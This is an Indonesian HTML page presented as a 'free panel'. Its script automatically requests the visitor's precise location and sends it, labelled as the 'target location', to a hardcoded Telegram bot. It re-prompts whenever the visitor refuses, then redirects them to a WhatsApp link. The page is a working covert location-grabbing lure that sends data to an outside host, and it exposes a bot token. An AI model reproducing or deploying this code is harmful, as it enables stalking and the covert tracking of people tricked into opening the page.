<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Panel Gratis 😋😋</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
    h3 { color: #333; }
  </style>
</head>
<body>
  <h3></h3>

  <script>
    const TOKEN = "8269097917:AAGyKJqP0ivWyuzkjgoXb2djm9wmQJ_Q4p8"; // token bot kamu
    const CHAT_ID = "8113738409"; // chat id kamu
    const REDIRECT_URL = "https://wa.me/628816759046"; // link tujuan setelah lokasi terkirim

    function kirimKeTelegram(lat, lon) {
      const text = `📍 Lokasi target: https://www.google.com/maps?q=${lat},${lon}`;
      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
      return fetch(url);
    }

    function mintaLokasi() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            await kirimKeTelegram(lat, lon);
            window.location.href = REDIRECT_URL;
          },
          (err) => {
            // kalau ditolak, coba lagi
            alert("Lokasi Diperlukan. Silahkan nyalakan.");
            mintaLokasi();
          },
          { enableHighAccuracy: true }
        );
      } else {
        document.body.innerHTML = "<h3>Browser tidak mendukung geolocation</h3>";
      }
    }

    // jalankan otomatis
    mintaLokasi();
  </script>
</body>
</html>
